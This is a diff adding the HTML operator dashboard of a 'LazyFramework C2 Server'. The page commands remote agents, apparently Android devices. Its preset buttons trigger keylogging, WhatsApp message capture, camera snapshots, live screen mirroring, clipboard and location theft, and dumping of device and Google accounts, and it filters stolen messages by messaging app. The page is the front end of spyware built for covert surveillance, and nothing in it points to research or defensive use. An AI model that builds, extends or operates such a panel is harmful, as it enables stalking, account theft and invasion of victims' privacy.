@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LazyFramework C2 Server</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="/static/js/script.js" defer></script>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🎯 LazyFramework C2 Server</h1>
+            <div class="status">
+                <span id="status-indicator" class="status-offline">●</span>
+                <span id="status-text">Disconnected</span>
+            </div>
+        </header>
+
+        <div class="stats">
+            <div class="stat-card">
+                <span class="stat-label">Agents</span>
+                <span class="stat-value" id="agent-count">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Online</span>
+                <span class="stat-value online" id="online-count">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Commands</span>
+                <span class="stat-value" id="command-count">0</span>
+            </div>
+            <div class="stat-card">
+                <span class="stat-label">Mirroring</span>
+                <span class="stat-value" id="mirror-count">0</span>
+            </div>
+        </div>
+
+        <div class="controls">
+            <input type="text" id="command-input" placeholder="Enter command...">
+            <button id="send-command-btn">Send</button>
+                <!-- ✅ TAMBAHKAN INPUT UNTUK WALLPAPER URL -->
+    <div id="wallpaper-section" style="display:none; margin-top:10px; padding:10px; background:#0a0e17; border-radius:6px; border:1px solid #1a2633;">
+        <label style="color:#6b7a8a; font-size:12px;">🖼️ Wallpaper URL:</label>
+        <input type="text" id="wallpaper-url" placeholder="https://example.com/image.jpg" 
+               style="width:70%; padding:8px 12px; background:#0a0e17; border:1px solid #1a2633; border-radius:4px; color:#c8d6e5; margin:0 8px;">
+        <button id="set-wallpaper-btn" style="padding:8px 16px; background:#ff6b6b; color:#0a0e17; border:none; border-radius:4px; cursor:pointer; font-weight:bold;">Set Wallpaper</button>
+    </div>
+            <div class="command-presets">
+                <!-- System -->
+                <button data-cmd="GET_DEVICE_INFO" title="Get device info">📱 Device</button>
+                <button data-cmd="GET_LOCATION" title="Get location">📍 Location</button>
+                <button data-cmd="GET_CLIPBOARD" title="Get clipboard">📋 Clipboard</button>
+                
+                <!-- Screenshot -->
+                <button data-cmd="SCREENSHOT" title="Take screenshot">📸 Screenshot</button>
+                <button data-cmd="CAMERA_SNAPSHOT" title="Take camera photo">📷 Camera</button>
+                
+                <!-- Screen Mirror -->
+                <button data-cmd="SCREEN_START" title="Start screen mirror">🔄 Mirror Start</button>
+                <button data-cmd="SCREEN_STOP" title="Stop screen mirror">⏹️ Mirror Stop</button>
+                    <!-- Wallpaper -->
+    <button data-cmd="SET_WALLPAPER" title="Set wallpaper from URL" style="color:#ff6b6b;">🖼️ Set Wallpaper</button>
+                <!-- Keylogger -->
+                <button data-cmd="KEYLOG_START" title="Start keylogger">⌨️ Keylog Start</button>
+                <button data-cmd="KEYLOG_STATUS" title="Check keylogger status">📊 Keylog Status</button>
+                <button data-cmd="KEYLOG_STOP" title="Stop keylogger">⌨️ Keylog Stop</button>
+                <button data-cmd="KEYLOG_DUMP" title="Dump keylogs">📄 Dump Logs</button>
+                
+                <!-- WhatsApp -->
+                <button data-cmd="WA_CAPTURE_START" title="Start WhatsApp capture">💬 WA Start</button>
+                <button data-cmd="WA_CAPTURE_STOP" title="Stop WhatsApp capture">💬 WA Stop</button>
+                <button data-cmd="WA_CAPTURE_DUMP" title="Dump WhatsApp messages">💬 WA Dump</button>
+                <!-- Di bagian command-presets, tambahkan: -->
+
+<!-- Accounts -->
+<button data-cmd="GET_ACCOUNTS" title="Get all device accounts" style="color:#ffd93d;">👤 All Accounts</button>
+<button data-cmd="GET_GOOGLE_ACCOUNTS" title="Get Google accounts" style="color:#4285F4;">🔵 Google Accounts</button>
+                <!-- Help -->
+                <button data-cmd="HELP" title="Show help">❓ Help</button>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="agents-panel">
+                <div class="panel-header">
+                    <h2>📱 Agents</h2>
+                    <button id="refresh-agents">⟳</button>
+                </div>
+                <div id="agent-list">
+                    <div class="loading">Loading agents...</div>
+                </div>
+            </div>
+
+            <div class="output-panel">
+                <div class="panel-header">
+                    <h2>📋 Output</h2>
+                    <div class="output-tabs">
+                        <button class="tab active" data-tab="output">📄 Output</button>
+                        <button class="tab" data-tab="screenshot">📸 Screenshots</button>
+                        <button class="tab" data-tab="keylog">⌨️ Keylogs</button>
+                        <button class="tab" data-tab="whatsapp">💬 WhatsApp</button>
+                        <button class="tab" data-tab="livemirror" style="color:#00d2ff;font-weight:bold;">📺 Live Mirror</button>
+                        <button class="tab" data-tab="wallpaper" style="color:#ff6b6b;">🖼️ Wallpaper</button>
+                    </div>
+                    <!-- Di bagian tab-content -->
+<div id="wallpaper-tab" class="tab-content">
+    <div id="wallpaper-content">
+        <div class="info">🖼️ Wallpaper History</div>
+        <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+            Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">SET_WALLPAPER &lt;URL&gt;</code> to change wallpaper
+        </div>
+    </div>
+</div>
+                    <div id="accounts-tab" class="tab-content">
+    <div id="accounts-content">
+        <div class="info">👤 No accounts data yet</div>
+        <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+            Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ffd93d;">GET_ACCOUNTS</code> or 
+            <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ffd93d;">GET_GOOGLE_ACCOUNTS</code> to an agent
+        </div>
+    </div>
+</div>
+                    <button id="clear-output">Clear</button>
+                </div>
+                    <!-- ✅ TAMBAHKAN FILTER PLATFORM -->
+    <div class="filter-bar" style="padding: 8px 12px; background: #0a0e17; border-bottom: 1px solid #1a2633; display: flex; gap: 8px; flex-wrap: wrap;">
+        <span style="color:#6b7a8a;font-size:12px;">Filter:</span>
+        <button class="filter-btn active" data-platform="all" style="background:#1a2633;color:#c8d6e5;border:none;padding:2px 12px;border-radius:10px;font-size:11px;cursor:pointer;">All</button>
+        <button class="filter-btn" data-platform="whatsapp" style="background:#1a2633;color:#25D366;border:none;padding:2px 12px;border-radius:10px;font-size:11px;cursor:pointer;">💬 WhatsApp</button>
+        <button class="filter-btn" data-platform="instagram" style="background:#1a2633;color:#E4405F;border:none;padding:2px 12px;border-radius:10px;font-size:11px;cursor:pointer;">📸 Instagram</button>
+        <button class="filter-btn" data-platform="twitter" style="background:#1a2633;color:#1DA1F2;border:none;padding:2px 12px;border-radius:10px;font-size:11px;cursor:pointer;">🐦 Twitter/X</button>
+        <button class="filter-btn" data-platform="telegram" style="background:#1a2633;color:#0088CC;border:none;padding:2px 12px;border-radius:10px;font-size:11px;cursor:pointer;">✈️ Telegram</button>
+        <button class="filter-btn" data-platform="messenger" style="background:#1a2633;color:#00B2FF;border:none;padding:2px 12px;border-radius:10px;font-size:11px;cursor:pointer;">💙 Messenger</button>
+        <button class="filter-btn" data-platform="other" style="background:#1a2633;color:#6b7a8a;border:none;padding:2px 12px;border-radius:10px;font-size:11px;cursor:pointer;">📱 Other</button>
+    </div>
+                <div id="output-container">
+                    <div id="output-tab" class="tab-content active">
+                        <div id="output-content">
+                            <div class="info">Select an agent to start</div>
+                        </div>
+                    </div>
+                    <div id="screenshot-tab" class="tab-content">
+                        <div id="screenshot-content">No screenshots yet</div>
+                    </div>
+                    <div id="keylog-tab" class="tab-content">
+                        <div id="keylog-content">No keylogs yet</div>
+                    </div>
+                    <div id="whatsapp-tab" class="tab-content">
+                        <div id="whatsapp-content">
+                            <div class="info">No WhatsApp messages yet</div>
+                        </div>
+                    </div>
+                    <div id="livemirror-tab" class="tab-content">
+                        <div id="livemirror-content">
+                            <div class="info">📺 Live Mirror Preview</div>
+                            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
+                                Start with <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">SCREEN_START</code>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="selected-agent" style="display:none;">
+            <span id="selected-agent-id"></span>
+        </div>
+    </div>
+</body>
+</html>
